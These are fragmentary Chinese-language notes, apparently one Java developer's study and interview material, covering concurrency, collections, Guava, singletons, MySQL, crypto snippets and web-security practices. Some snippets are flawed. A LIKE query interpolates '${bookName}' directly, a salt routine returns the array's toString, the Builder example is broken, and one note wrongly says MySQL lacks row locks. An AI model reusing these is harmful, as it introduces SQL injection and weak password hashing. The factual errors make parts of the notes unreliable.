Jersey
--------------------------------------------------------------------------------------
Spock测试框架 Groovy
--------------------------------------------------------------------------------------
Httpclient
--------------------------------------------------------------------------------------
htmlunit Selenium
--------------------------------------------------------------------------------------
java 7 java8与guava相似点 多线程 Java Concurrency in Practice
--------------------------------------------------------------------------------------
guava与common lang相似点
--------------------------------------------------------------------------------------
jersey与sprinv mvc区别
--------------------------------------------------------------------------------------
简历
  写具体（带版本号) 优点 不足 期望
  熟悉java 6,java7,java8,了解java9  能写出简单demo 别人不知道的
  1)熟悉熟悉多线程,nio netty
  2)熟悉junit,mockio等测试框架
  3)熟悉guava
  4)了解restful,熟悉jersey框架
  5)熟悉kettle
  6)了解url mongodb
  7)了解bootstrap
  8)了解spring mvc,shiro
  9)熟悉java加解密(bouncycastle)
  熟悉mysql,了解mysql5.6 mysql 5.7特性,熟悉oracle

 java8优势
 http://www.codeceo.com/article/java-8-new-feature.html
命名冲突  主键_* 失败重试
涉及中文的 确定编码
记反了字段
代码一定会有bug
--------------------------------------------------------------------------------------
ConcurrentHashMap 使用了striped锁来提高并发性 分离锁
ConcurrentHashMap使用分段锁技术,将数据分成一段一段的存储,然后给每一段数据配一把锁,
当一个线程占用锁访问其中一个段数据的时候,其他段的数据也能被其他线程访问,能够实现真正的并发访问

ConcurrentHashMap内部分为很多个Segment,每一个Segment拥有一把锁,
然后每个Segment（继承ReentrantLock）下面包含很多个HashEntry列表数组

多线程环境下，使用Hashmap进行put操作会引起死循环
HashTable容器使用synchronized来保证线程安全

Segment的个数是大于等于concurrencyLevel的第一个2的n次方的数
Node<K,V> implements Map.Entry<K,V>

弱一致性
put操作将一个元素加入到底层数据结构后，get可能在某段时间内还看不到这个元素

让HashMap同步
Map m = Collections.synchronizeMap(hashMap);
--------------------------------------------------------------------------------------
java 5特性
泛型
枚举类型 Enum
自动装箱拆箱（自动类型包装和解包）
可变参数varargs
Annotations(如Override Deprecated SupressWarnings)
新的迭代语句foreach
静态导入

java7特性
1 int long类型可以使用下划线 可以使用二进制ob0101赋值
2try里面声明的资源自动关闭 catch可以捕获多个异常
  所有实现了 java.lang.AutoCloseable 接口
 （其中,它包括实现了 java.io.Closeable 的所有对象）

3switch可以使用字符串类型
4线程安全ThreadLocalRandom.current().nextInt(10)
5文件监听WatchService (common-io)
WatchService watchService = FileSystems.getDefault()
				.newWatchService()) {
			// 给path路径加上文件观察服务
path.register(watchService, StandardWatchEventKinds.ENTRY_CREATE,
					StandardWatchEventKinds.ENTRY_MODIFY,
					StandardWatchEventKinds.ENTRY_DELETE);
while true
final WatchKey key = watchService.take();
				// get list of pending events for the watch key
				for (WatchEvent<?> watchEvent : key.pollEvents()) {
6文件nio(非阻塞io)遍历文件 实现FileVisitor
7fork-join框架 任务分割合并  AtomicIntegerArray ConcurrentLinkedDeque(双端队列) Phaser(countdown)

jdk工具 jcmd -l 参数-l表示列出所有java虚拟机
       jcmd 4548 help help命令列出该虚拟机支持的所有命令

导出堆信息GC.heap_dump jcmd 4548 GC.heap_dump /dump.log
建议使用jcmd代替jmap

Java 7为间接调用方法引入了java.lang.invoke包,即方法句柄,可以提高安全性和代码的可读性

switch是支持enum类型
--------------------------------------------------------------------------------------
java8特性
1 接口的默认方法 default
2 Lambda 表达式 Collections.sort compare (a, b) -> b.compareTo(a)
3 date time分开
4 多重注解

元空间（从Java 8开始永久代的一种替代实现

Lambda表达式最主要的优势表现在性能方面 比匿名内部类加载要快
--------------------------------------------------------------------------------------
guava特性
1 ArrayListMultimap<String, String> multiMap = ArrayListMultimap.create();
Multiset<String> set = HashMultiset.create();
值 key不重复BiMap<String, String> biMap = HashBiMap.create();
2 不可变ImmutableMap ImmutableListMultimap
3 set Sets.union Sets.intersection Sets.difference 交集并集差集  SetMultimap
4 Table： 矩阵
5 String Joiner.on(",").join withKeyValueSeparator
6 guava线程命名ThreadFactory threadFactory = new ThreadFactoryBuilder().setNameFormat("Print-%d").setDaemon(true)
				.build();
7 令牌算法RateLimiter limiter = RateLimiter.create(5.0);
8 BloomFilter<String> b = BloomFilter.create(Funnels.stringFunnel(Charset.forName("utf-8")), 1000, 0.000001);// 设置待检测元素的个数与误判率
9 guava Cache<String, String> cache = CacheBuilder.newBuilder().maximumSize(1000).build();
cache.get(keyValue, new Callable<V>()
10 String to enum Enums.stringConverter
11 Monitor 避免while循环 限制只有一个进入
12 Futures.addCallback(listenableFuture, new FutureCallback<Integer>()

guava超时
TimeLimiter limiter = new SimpleTimeLimiter();
Callable<T> proxy = limiter.newProxy(callable, Callable.class, timeoutDuration, timeoutUnit);
return proxy.call();

循环
Iterables.limit(Iterables.cycle(1, 2, 3), 3)
Iterables.limit(Iterables.skip(list, 2), 5);

commons.collections
CollectionUtils.union(); // 并集
CollectionUtils.intersection(); // 交集
CollectionUtils.containsAny(); // 是否存在交集
CollectionUtils.disjunction(); // 交集的补集
CollectionUtils.subtract(); // 差集
CollectionUtils.filter(); // 过滤
--------------------------------------------------------------------------------------
apache common collections
1 BidiMap bidiMap = new DualHashBidiMap(); //getkey通过值获取key
2 MultiKeyMap multiKeyMap = new MultiKeyMap(); MultiKey multiKey = new MultiKey("a", "b");
  MultiValueMap multiValueMap = new MultiValueMap();
3 Predicate Iterator<?> iterator = new FilterIterator(list.iterator(), predicate);
--------------------------------------------------------------------------------------
尽量使用原生类型
小心使用Thread-local变量,特别是在使用线程池的情况下
--------------------------------------------------------------------------------------
Rest-assured
--------------------------------------------------------------------------------------
HashMap()：构建一个初始容量为 16,负载因子为 0.75 的 HashMap resize后的HashMap容量是容量的两倍
1不是线程安全的 使用迭代器的过程中有其他线程修改了map,那么将抛出ConcurrentModificationException,这就是所谓fail-fast策略
通过modCount域 对HashMap内容的修改都将增加这个值
2允许使用null值和null 无顺序

当你向HashMap插入一个key的时候,首先,这个对象的hashCode()方法会被调用,调用结果用来计算将要存储的位置
会使用equals()方法来将此对象与所有这些Map.Entry所包含的key进行对比

key值可以重复的map,就是IdentityHashMap 利用哈希表实现 Map 接口,比较键（和值）时使用引用相等性代替对象相等性

ConcurrentHashMap中的key和value值都不能为null
ConcurrentHashMap put null值报空指针
Map map.put(null, null);

size函数需要访问所有数据,也就需要取得所有的锁

map set接口
--------------------------------------------------------------------------------------
int middle = left + ((right - left) >> 1); 防止溢出
--------------------------------------------------------------------------------------
public class Singleton_静态内部类 {
	private static class Singleton_Holder_S3 {
		private static final Singleton_静态内部类 INSTANCE = new Singleton_静态内部类();
	}

	private Singleton_静态内部类() {
	}

	public static final Singleton_静态内部类 getInstance() {
		return Singleton_Holder_S3.INSTANCE;
	}
}
public enum FooEnumSingleton {
    INSTANCE;
    public static FooEnumSingleton getInstance() { return INSTANCE; }
    public void bar() { }
}

反序列化的时候则是通过java.lang.Enum的valueOf方法来根据名字查找枚举对象
编译器是不允许任何对这种序列化机制的定制的,因此禁用了writeObject、readObject、readObjectNoData、writeReplace和readResolve等方法

dcl解决方法
public class DoubleCheckedSingleton {
    private volatile static DoubleCheckedSingleton singleton = null;
    //私有构造函数,防止生成实例
    private DoubleCheckedSingleton()  {    }

    public static DoubleCheckedSingleton getInstance() {
        if (singleton== null)  {                               // 第一次检查
            synchronized (DoubleCheckedSingleton.class) {
                if (singleton== null)  {                       // 第二次检查
                    singleton= new DoubleCheckedSingleton();   // 问题：指令重排序
                }
            }
        }
        return singleton;
    }
}

一旦实现了Serializable接口之后,就不再是单例得了,每次调用 readObject()方法返回的都是一个新创建出来的对象
有一种解决办法就是使用readResolve()方法来避免

解决参数多  级联调用
public class NutritionFacts_Build {
	private final int calories;
	private NutritionFacts_Build(Builder builder) {
		calories = builder.calories;
	}
    public static class Builder {
        public Builder calories(int val) {
			      calories = val;
		        return this;
		}
	    public NutritionFacts_Build build() {
			   return new NutritionFacts_Build(this);
	    }
  }
  main{
   NutritionFacts_Build cocaCola = new NutritionFacts_Build.calories(100).build();
  }
}



--------------------------------------------------------------------------------------
1继承extends ThreadPoolExecutor 监听状态
startTimes = new ConcurrentHashMap<String, Date>();
beforeExecute  put(String.valueOf(r.hashCode()), new Date());
2新增单独线程监听 注入ThreadPoolExecutor executor
System.out.println(
                    String.format("[monitor] [%d/%d] Active: %d, Completed: %d, Task: %d, isShutdown: %s, isTerminated: %s",
                        this.executor.getPoolSize(),
                        this.executor.getCorePoolSize(),
                        this.executor.getActiveCount(),
                        this.executor.getCompletedTaskCount(),
                        this.executor.getTaskCount(),
                        this.executor.isShutdown(),
                        this.executor.isTerminated()));

CPU密集型任务(ncpu + 1)
I/O密集型任务(2 * ncpu)

import java.util.concurrent.RejectedExecutionHandler;
import java.util.concurrent.ThreadPoolExecutor;
public class RejectedExecutionHandlerImpl implements RejectedExecutionHandler {
    public void rejectedExecution(Runnable r, ThreadPoolExecutor executor) {
        System.out.println(r.toString() + " is rejected");
    }
}

ThreadFactory threadFactory = Executors.defaultThreadFactory();
public ThreadPoolExecutor(int corePoolSize,
                              int maximumPoolSize,
                              long keepAliveTime,
                              TimeUnit unit,
                              BlockingQueue<Runnable> workQueue,
                              ThreadFactory threadFactory,
                              RejectedExecutionHandler handler)
--------------------------------------------------------------------------------------
show global status like 'com_select';  查询 命中

mysql的查询缓存命中率 ≈ qcache_hits / (qcache_hits + com_select)
show global status like 'QCache%'
--------------------------------------------------------------------------------------
单锁的分拆降低冲突概率 在内部都有多个计数器,这样在并发更新对象的时候,随机选择一个
--------------------------------------------------------------------------------------
计划
  看下bootstrap --
  redis应用 限流 统计 排序
  关注mysql优化
  了解nginx
  jFinal
  文档编写
  使用idea
  mvc框架原理
  熟悉ftp、http等传输协议
  数据分析、数据建模
  cxf
  restful开发架构  验证  cxf rest
  jvm原理 --
  工作流
  开源框架（其特性及其实现原理)
  JMS(java消息服务)、JMX(Java管理扩展)
  Scrum/Kanban敏捷开发
  数据库调优 --
  Spring Security、Spring Social、Apache Shiro
  规则引擎,如JBoss Drools
  MongoDB --
  mysql存储过程
  消息中间件 ActiveMQ RabbitMQ
  加解密技术
  熟悉SOA架构和Web services技术
  groovy angularjs Shell
  设计缺陷(框架实现原理 缺点)
  Freemarker/Velocity --
  异步消息
  互联网安全(常见漏洞)
  精通事务
  SoapUI 测试工具
  了解UML(会画)
  AIO,NIO异步开发模式
  掌握Hibernate配置及HQL的使用,了解连接池与缓存
  OSGI
  markdown
  thrift
  x509
  memcached
  MySQL原理和架构
  大型网站监控
  熟悉knockoutjs、emberjs、angularjs、avalon  React.js databases前端常用js库
  英文流利
  熟悉接口技术,如webservice,thrift和hessian
  Jenkins
  掌握ForkJoin,React模型
  https://avalonjs.github.io/
  rpc
  idea
--------------------------------------------------------------------------------------
public static Element parseXml(InputStream in,String encoding) throws Exception {
		SAXReader saxReader = new SAXReader();
		InputStreamReader utf8In = new InputStreamReader(in, encoding);
		Document document = saxReader.read(utf8In);
		return document.getRootElement();
}
--------------------------------------------------------------------------------------
xfire原理 基于webservice

有那些安全设计
1 参数签名token rsa/aes 报文加密
2 接口限流(阀值) redis
3 密码加盐salt 密码含大小 小写 数字 位数限制 加盐、多重哈希

PBKDF2 密码盐渍算法
PBEKeySpec spec = new PBEKeySpec(password, salt, iterations, bytes * 8);
SecretKeyFactory skf = SecretKeyFactory.getInstance(PBKDF2_ALGORITHM);
return skf.generateSecret(spec).getEncoded();

4 要求登录的操作检查session 登录验证码 失败次数限制 关键操作记录表日志
5 文件下载 遍历目录攻击 过滤./ ../ 文件上传限制类型(图片判断 读取一次,缩小) 文件路径操纵过滤..
6 输出显示信息转义 < -->lt 防xss攻击
7 参数校验 空指针
8 cookie设置httpOnly
response.addHeader("Set-Cookie", "uid=112; Path=/; HttpOnly");
9登录后将登陆前session失效重新生成新的session
10 参数校验(校验后 修改)

数据库
1 执行带参数sql使用preparestatement 参数使用? 参数注入 可以检查参数是否有delete等不应出现参数
2 控制数据库权限 数据库不使用root用户 删除root空密码 select table 删除表时候回收权限
select user,host,password from mysql.user;
delete from mysql.user where user='' and host='wopr';
flush privileges;
3 敏感信息加密 身份证信息 身份证图片加密
4 时间取数据库时间不取服务器时间 select sysdate from dual

框架
1 前后台分离 前台不能访问数据库 后台访问数据库 数据库内网
2 源代码禁止外网访问(包括通过跳转主机) 配置文件用户名密码加密

工具
1 使用官网下载的工具(防篡改)
2 struts使用稳定的新版
3

加salt的意义不是防止针对某个哈希值的暴力破解,是防止使用彩虹表批量破解哈希值

Log 欺骗 不以任何方式记录用户的敏感信息
--------------------------------------------------------------------------------------
多线程同步方式
1 synchronized
2 使用重入锁ReenreantLock ReentrantReadWriteLock
3 使用局部变量 threadlocal
AtomicInteger
--------------------------------------------------------------------------------------
des密钥长度8
aes加密可以设置偏移量和密钥
使用CBC模式，需要一个向量iv，可增加加密算法的强度
Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
byte[] dataBytes = data.getBytes("UTF-8");
SecretKeySpec keyspec = new SecretKeySpec(key.getBytes(), "AES");
IvParameterSpec ivspec = new IvParameterSpec(iv.getBytes());
cipher.init(Cipher.ENCRYPT_MODE, keyspec, ivspec);

rsa加密内容长度限制 分段加密int length = (mode == Cipher.ENCRYPT_MODE)? (KEY_SIZE/8-11) : KEY_SIZE/8;

Security.addProvider(new org.bouncycastle.jce.provider.BouncyCastleProvider());//BouncyCastleProvider使用单例

rsa原理 基于欧拉定理
Modulus相同  PrivateExponent PublicExponent不同
RSAPublicKeySpec pubKeySpec = new RSAPublicKeySpec(new BigInteger(
				modulus), new BigInteger(publicExponent));

private static String getSalt(){
	SecureRandom sr;
	byte[] salt = new byte[16];
	try {
		sr = SecureRandom.getInstance("SHA1PRNG", "SUN");
		sr.nextBytes(salt);
	} catch (Exception e) {
		e.printStackTrace();
	}
	return salt.toString();
}

循环冗余校验 CRC32 Adler32


|AES类型| 密钥长度 | 分组长度 | 加密轮数|
|AES-128|  4字     |   4字    |   10    |
|AES-192|  6字     |   4字    |   12    |
|AES-256|  8字     |   4字    |   14    |
BCrypt

非对称加密算法：RSA,DSA/DSS
对称加密算法：AES,RC4,3DES
HASH算法：MD5,SHA1,SHA256
--------------------------------------------------------------------------------------
mui.js html5页面 hbuilder开发工具 handerbars模板
http://dev.dcloud.net.cn/mui/ui/#button
--------------------------------------------------------------------------------------
Java日志API由以下三个核心组件组成：
 Loggers：Logger负责捕捉事件并将其发送给合适的Appender
 Appenders：也被称为Handlers,负责将日志事件记录到目标位置在将日志事件输出之前,Appenders使用Layouts来对事件进行格式化处理
 Layouts：也被称为Formatters,它负责对日志事件中的数据进行转换和格式化Layouts决定了数据在一条日志记录中的最终形式

--------------------------------------------------------------------------------------
Java对于eqauls方法和hashCode方法是这样规定的：
 1、如果两个对象相等,那么它们的hashCode值一定要相等；
 2、如果两个对象的hashCode相等,它们并不一定相等

hashcode方法返回该对象的哈希码值 hashCode是用于查找使用的 确定该对象在哈希表中的索引位置
 当集合要添加新的元素时,先调用这个元素的hashCode方法,定位到它应该放置的物理位置上

hashcode冲突
 相同的hashcode需要equals hash冲突 java.util.HashMap采用的链表法的方式,链表是单向链表
--------------------------------------------------------------------------------------
PreparedStatement是预编译的,对于批量处理可以大大提高效率
statement每次执行sql语句,相关数据库都要执行sql语句的编译,preparedstatement是预编译得,
preparedstatement支持批处理
传递给PreparedStatement对象的参数可以被强制进行类型转换
--------------------------------------------------------------------------------------
重排序分为两类：编译期重排序和运行期重排序
编译期重排序的就是通过调整指令顺序,在不改变程序语义的前提下,尽可能减少寄存器的读取、存储次数,充分复用寄存器的存储值

As-if-serial语义的意思是,所有的动作(Action)5都可以为了优化而被重排序,但是必须保证它们重排序后的结果和程序代码本身的应有结果是一致的

--------------------------------------------------------------------------------------
volatile关键字可以保证变量的可见性 局部阻止重排序的发生
--------------------------------------------------------------------------------------
happens-before
程序次序法则：线程中的每个动作A都happens-before于该线程中的每一个动作B,其中,在程序中,所有的动作B都能出现在A之后
监视器锁法则：对一个监视器锁的解锁 happens-before于每一个后续对同一监视器锁的加锁
volatile变量法则：对volatile域的写入操作happens-before于每一个后续对同一个域的读写操作
线程启动法则：在一个线程里,对Thread.start的调用会happens-before于每个启动线程的动作
线程终结法则：线程中的任何动作都happens-before于其他线程检测到这个线程已经终结、或者从Thread.join调用中成功返回,或Thread.isAlive返回false
中断法则：一个线程调用另一个线程的interrupt happens-before于被中断的线程发现中断
终结法则：一个对象的构造函数的结束happens-before于这个对象finalizer的开始
传递性：如果A happens-before于B,且B happens-before于C,则A happens-before于C
happen-before只发生在不同的线程或变量访问之间而对于一个方法的内部
--------------------------------------------------------------------------------------
juc

--------------------------------------------------------------------------------------
分段锁 ConcurrentHashMap使用分段锁 Segment来保护不同段的数据
--------------------------------------------------------------------------------------
InputStream为什么不能被重复读取
Stream是一个管道,是一个数据流而不是一个容器管道只负责数据的流通而不负责数据的 存储
--------------------------------------------------------------------------------------
actor
--------------------------------------------------------------------------------------
http://sparkjava.com/download.html spark框架 jOOQ jMock AssertJ
--------------------------------------------------------------------------------------
xml的可读性比json好
JSON更简洁,更节省资源
--------------------------------------------------------------------------------------
tcp 流量怎么控制
TCP的流控制方案是采用滑动窗口协议 通信双方主机上都分别有一个发送窗口和一个接收窗口
几种拥塞控制方法
慢开始、拥塞避免、快重传和快恢复
--------------------------------------------------------------------------------------
rest 有三种验证方式：Basic Auth/Digest Auth/OAuth(XAuth)
REST的原则
为每个资源提供一个URL,且资源应该是名词而不是动词 /user/10 getUser/10(not)

rest认证
使用 POST 方法去请求,附带数据为认证用的信息,返回结果看你的业务逻辑,但至少要有一个 token
客户端拿到 token 之后,先把它存起来（比如存到 SessionStorage 里）,
设置请求时的 HEADER 里 Authorization 的值为 Bearer <token>
oauth2协议
--------------------------------------------------------------------------------------

快排原理
 通过一躺排序将要排序的数据分割成独立的两部分,其中一部分的所有数据都比另外一不部分的所有数据都要小,
然后再按次方法对这两部分数据分别进行快速排序,整个排序过程可以递归进行,以此达到整个数据变成有序序列

--------------------------------------------------------------------------------------
http://v3.bootcss.com/getting-started/#examples
http://www.bootcss.com/
http://www.cnblogs.com/0201zcr/p/4905234.html
http://v3.bootcss.com/components/
http://www.runoob.com/bootstrap/bootstrap-environment-setup.html
--------------------------------------------------------------------------------------
顺序
<a class="..." id="..." data-modal="toggle" href="#">
  Example link
</a>
class 名称中只能出现小写字符和破折号

--------------------------------------------------------------------------------------
http://lion.newtouch.com/index.html 代码生成框架
--------------------------------------------------------------------------------------
cvs 对应的连接协议为pserver
--------------------------------------------------------------------------------------
检查某个或者某些jar包是否被签名
jarsigner -verify <your_jar_name>
--------------------------------------------------------------------------------------
https://github.com/ysc/HtmlExtractor
--------------------------------------------------------------------------------------
select unix_timestamp(STR_TO_DATE("2015-10-22",'%Y-%m-%d %H:%i:%s'))
--秒
select from_unixtime(unix_timestamp(),'%Y-%m-%d %H:%i:%s'),unix_timestamp()

--------------------------------------------------------------------------------------
var x = Math.floor(Math.random() * (max - min + 1)) + min;
--------------------------------------------------------------------------------------
http://draggabilly.desandro.com/ 拖动
--------------------------------------------------------------------------------------
bookName like CONCAT('%','${bookName}','%' )
--------------------------------------------------------------------------------------
随机颜色问题：
var b = Math.random() * 16777215 |0 ; 16777215  颜色白色的十进制表示
var color = "#" + b.toString(16);
--------------------------------------------------------------------------------------
事件分为三个阶段：   事件捕获 -->  事件目标 -->  事件冒泡
--------------------------------------------------------------------------------------
服务端编程的3大性能杀手：
1、大量线程导致的线程切换开销
2、锁
3、非必要的内存拷贝
--------------------------------------------------------------------------------------
select * from information_schema.innodb_trx 事务
--------------------------------------------------------------------------------------
ArrayList
功能：有序非线程安全列表要点：
底层存储用Object数组
元素可为null
自动扩容至1.5倍
适合随机访问,不适合大量或频繁增删

LinkedList
功能：有序非线程安全列表要点：
基于双向链表实现
元素可为null
同时实现了双端队列Deque,支持队列、堆栈操作
适合增删,顺序访问,不适合随机访问

Stack
功能：基于Vector实现的堆栈要点：
线程安全
后进先出（LIFO）1

CopyOnWriteArrayList 只能在量小读多写少的场景下用,且性能很差
功能：快照版本的ArrayList,修改操作通过复制一份数组
线程安全
任何修改都会在拷贝的新副本上进行
修改操作通过ReentrantLock同步
迭代器只能访问,不能修改,且不会因为遍历过程中修改而抛异常
实现线程安全List的方法


使用Collections.synchronizedList()：工具类提供的一个比较简便的方法,可以直接创建一个线程安全的list,建议使用
其原理是对ArrayList进行包装,通过一个对象锁来控制并发,需要注意的是要弄清楚对象锁锁的是哪个对象
线程安全仅仅指的是直接使用它提供的函数 读写操作都比较均匀的地方

TreeMap
功能：基于红黑树实现的有序集合
非线程安全
底层为一个棵红黑树
继承NavigableMap,主要实现了SortMap,因此是有序的
--------------------------------------------------------------------------------------
http://dt.thxopen.com/example/ datatables  --
http://blog.codepiano.com/pages/jquery-datatables-config-cn.html
http://www.requirejs.cn/
--------------------------------------------------------------------------------------
UML的关系：依赖、关联、泛化和实现
--------------------------------------------------------------------------------------
java不可变
java中String类其实就是对字符数组的封装 可以反射出String对象中的value属性, 进而改变通过获得的value引用改变数组的结构
所有的对象都由一个引用指向
--------------------------------------------------------------------------------------
HTTP方法的幂等性是指一次和多次请求某一个资源应该具有同样的副作用
--------------------------------------------------------------------------------------
Thread.setDefaultUncaughtExceptionHandler(new UncaughtExceptionHandler() {

    public void uncaughtException(Thread arg0, Throwable arg1) {


    }
});
--------------------------------------------------------------------------------------
第一个任务在工作队列中,并等待第二个任务的结果；而第二个任务则处于等待队列中,等待第一个任务执行完成后被执行
线程池执行任务时,应该避免相互依赖的任务被提交到同一个线程池中
--------------------------------------------------------------------------------------
new Timer().schedule(new TimerTask() {
			public void run() {
				System.out.println("bombing");
			}
		}, 10000, 3000);
--------------------------------------------------------------------------------------
线程饥饿
高优先级线程吞噬所有的低优先级线程的CPU时间
线程被永久堵塞在一个等待进入同步块的状态

不公平锁能够提高吞吐量但不可避免的会造成某些线程的饥饿
--------------------------------------------------------------------------------------
RPC 远程过程调用协议
RPC采用客户机/服务器模式请求程序就是一个客户机,而服务提供程序就是一个服务器
RPC 需要两个协议： 对象序列化协议 和 调用控制协议

分布式是分布什么

分布式是以缩短单个任务的执行时间来提升效率的,而集群则是通过提高单位时间内执行的任务数来提升效率
分布式是指将不同的业务分布在不同的地方；而集群指的是将几台服务器集中在一起,实现同一业务
--------------------------------------------------------------------------------------
各种xml框架声明 使用 --已完成创建 保存 解析 xpath未完成
domej ElementHandler模式解析xml
SAXReader sax = new SAXReader();
sax.addHandler("/room/students/student",new Dom4jPubElementHandler());

detach()

自带w3c document xpath够用
XPath xpath = XPathFactory.newInstance().newXPath();
NodeList bookList = (NodeList) xpath.evaluate("//inventory/book", doc,XPathConstants.NODESET);
String title = (String) xpath.evaluate("./title/text()", book,XPathConstants.STRING);

Node node = (Node) xpath.evaluate("/rss", doc, XPathConstants.NODE);

有子节点
NodeList nodeList = (NodeList) xpath.evaluate("//*[*]", doc,XPathConstants.NODESET);

有属性
//*[@*]
--------------------------------------------------------------------------------------
mq 消费机制 重试主要用在网络连接拥堵场景
--------------------------------------------------------------------------------------
function trim(str,delimeter){
  var reg = delimeter ? new RegExp("(^"+delimeter+"*|"+delimeter+"*$)","g") : /(^\s*|\s*$)/g;
  return str.replace(reg,"");
}
--------------------------------------------------------------------------------------
前端页面有哪三层构成,分别是什么?作用是什么?
结构层；主要指DOM节点；HTML/XHTML
样式层；主要是指页面渲染；CSS
脚本层：主要指页面动画效果；JS/AS
--------------------------------------------------------------------------------------
CSS选择符号有哪些？
标签选择符,类选择符,ID选择符
--------------------------------------------------------------------------------------

https://github.com/qiu-deqing/FE-interview 前端面试题
--------------------------------------------------------------------------------------

web开发中会话跟踪的方法有哪些
cookie
session
url重写
隐藏input
ip地址
--------------------------------------------------------------------------------------
css hack原理及常用hack
原理：利用不同浏览器对CSS的支持和解析结果不一样编写针对特定浏览器样式
常见的hack有1）属性hack2）选择器hack3）IE条件注释
--------------------------------------------------------------------------------------

http://www.tuicool.com/articles/j6z2U3 akka  研究actor
http://git.oschina.net/liuyieyer/projects

Actor模型的一个劣势是,它要求你避免全局状态

http://ifeve.com/akka-2-3-6/
--------------------------------------------------------------------------------------
https://dev.mysql.com/doc/refman/5.7/en/json.html

http://dev.mysql.com/doc/refman/5.6/en/timestamp-initialization.html
https://dev.mysql.com/doc/refman/5.7/en/spatial-extensions.html
--------------------------------------------------------------------------------------
document.getElementById('selected').innerHTML = "";

2016-12-31
new Date(2016,11,31).toLocaleString()
--------------------------------------------------------------------------------------
icheck
--------------------------------------------------------------------------------------
CALL proce_getresult_bypage (
	'db_ap_rgsh_vertify_log_bdj',
	'logid,create_date,telephone',
	5,
	1,
	'',
	'',
  @i
)
--------------------------------------------------------------------------------------
MySQL automatically casts a string to a number  a string that does not begin with a number is evaluated as 0:
select 'a'=0 -->1
SELECT '1abc' + '2ef' AS total; -->3
--------------------------------------------------------------------------------------
avalon 迷你mvvc
https://avalonjs.github.io/

react
--------------------------------------------------------------------------------------
bootstrap-treeview  jointjs 图表(关系图)
http://www.htmleaf.com/ jquery之家
--------------------------------------------------------------------------------------
TransactionAspectSupport.currentTransactionStatus().setRollbackOnly();// 手动回滚,对于捕获的
--------------------------------------------------------------------------------------
https://github.com/jobbole/awesome-java-cn/blob/master/README.md#ancients  Java资源大全中文版
--------------------------------------------------------------------------------------
Gson gson = new GsonBuilder().disableHtmlEscaping().create();
--------------------------------------------------------------------------------------
~~利用符号进行的类型转换,转换成数字类型 ~~undefined 0
!!将一个元素转为布尔类型的值 !!undefined // false
--------------------------------------------------------------------------------------
http://hi.haojima.net/job/index 搜索工作
--------------------------------------------------------------------------------------
transient用来表示一个域不是该对象串行化的一部分当一个对象被串行化的时候,transient型变量的值不包括在串行化的表示中
transient修饰的字段,是否会被序列化,取决于writeObject方法的实现
HashMap 中的存储数据的数组数据成员中,数组还有很多的空间没有被使用,没有被使用到的空间被序列化没有意义
所以需要手动使用 writeObject() 方法,只序列化实际存储元素的数组
--------------------------------------------------------------------------------------

判断支持console
if(window.console&&window.console.log)
--------------------------------------------------------------------------------------
http://www.cnblogs.com/Yirannnnnn/p/4933332.html 居中
--------------------------------------------------------------------------------------
http://niceue.com/validator/demo/   nicevalidate
--------------------------------------------------------------------------------------
http://www.cnblogs.com/lansy/p/4355913.html bstrap
--------------------------------------------------------------------------------------
是否是window 对象,value != null  && value === value.window;
--------------------------------------------------------------------------------------
时间格式兼容
var date = new Date(strDate.replace(/-/g,"/"));
--------------------------------------------------------------------------------------
<span style="font-family:‘Times New Roman‘;">&nbsp;&nbsp;&nbsp;&nbsp;</span>
--------------------------------------------------------------------------------------
Java 中的finalize有哪些问题？
影响 GC 性能,可能会引发OutOfMemoryException
finalize方法中对异常处理不当会影响 GC
子类中未调用super.finalize会导致父类的finalize得不到执行
--------------------------------------------------------------------------------------
强引用 Object obj = new Object();
软引用 java.lang.ref.SoftReference  软引用可用来实现内存敏感的高速缓存 和一个引用队列（ReferenceQueue）联合使用
  1.当其指示的对象没有任何强引用对象指向它；
  2.当虚拟机内存不足时
弱引用 java.lang.ref.WeakReference
虚引用 java.lang.ref.PhantomReference 主要用来跟踪对象被垃圾回收器回收的活动

WeakHashMap:key 是弱引用类型,
--------------------------------------------------------------------------------------
MySQL按照汉字的拼音排序
order by convert(name using gbk) asc; 同
--------------------------------------------------------------------------------------
1.对频繁操作的表行,要加上乐观锁,防止写丢失mysql不支持行锁,需要在程序中加入hibernate自带version字段
2.表设计上尽量采用分库,减少一台数据库在高并发环境下,性能低下
3.事务加到service层,可以保证同时回滚
4.数据库中某些字段可以确定唯一的情况下,最好加入唯一索引,防止数据插入重复对查询的字段加上索引
5.对方法的并发操作,加上synchronized.
--------------------------------------------------------------------------------------

--------------------------------------------------------------------------------------
Type的子接口
Type有四个子接口：ParameterizedType,TypeVariable,WildcardType,GenericArrayType
--------------------------------------------------------------------------------------
防止浏览器记住用户名及密码
<input type="text" name="password" onfocus="this.type='password'" autocomplete="off"/>
--------------------------------------------------------------------------------------
mysql支持emoji解决办法
ALTER TABLE `TABLE_NAME` CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;
ALTER TABLE `TABLE_NAME`MODIFY COLUMN `COLUMN_NAME`  varchar CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;
--------------------------------------------------------------------------------------

为什么div里嵌套了img，img底部会有间隙。 http://www.qdfuns.com/notes/17631/9dc4c1d4006bdd2a84de2acf3b01be2d.html
div的高度=img的高度
当div中没有文字时,可以使用font-size:0;或者line-height:0;
当div中有文字时,可以设置img为vertical-align:bottom；
--------------------------------------------------------------------------------------
泛型却是不支持协变 子类传入父类

采用参数化类型
public <T> void func2(List<T> list) {
}

数组却是支持协变
Integer[] intArray = new Integer[10];
Number[] numberArray = intArray;
--------------------------------------------------------------------------------------
类继承的缺点

超类改变,子类要跟着改变,违反了"开——闭"原则
不能动态改变方法实现,不能在运行时改变由父类继承来的实现
破坏原有封装,因为基类向子类暴露了实现细节
继承会导致类的爆炸
--------------------------------------------------------------------------------------
获得nginx真实地址
proxy_set_header            X-real-ip $remote_addr;
request.getAttribute("X-real-ip")
--------------------------------------------------------------------------------------
AOP使用场景
Authentication 权限
Caching 缓存
Error handling 错误处理
logging
Transactions 事务
--------------------------------------------------------------------------------------

参数 -XX:+TraceClassLoading 来追踪哪些类被加载
--------------------------------------------------------------------------------------
Java 类加载器的层次结构
启动类加载器 (Bootstrap Class Loader)
扩展类加载器 (Extensions Class Loader)
应用程序类加载器 (Application Class Loader)
--------------------------------------------------------------------------------------
Spring Http Invoker
--------------------------------------------------------------------------------------
单对象多线程的同步
public  void operate_this() {
synchronized(this){
使用[this]同步时需要是同一对象的才能同步,多对象时是同步失败的因为同步是对this对象锁,不同对象时锁互不影响
--------------------------------------------------------------------------------------
静态对象同步 单体类单对象多线程的同步
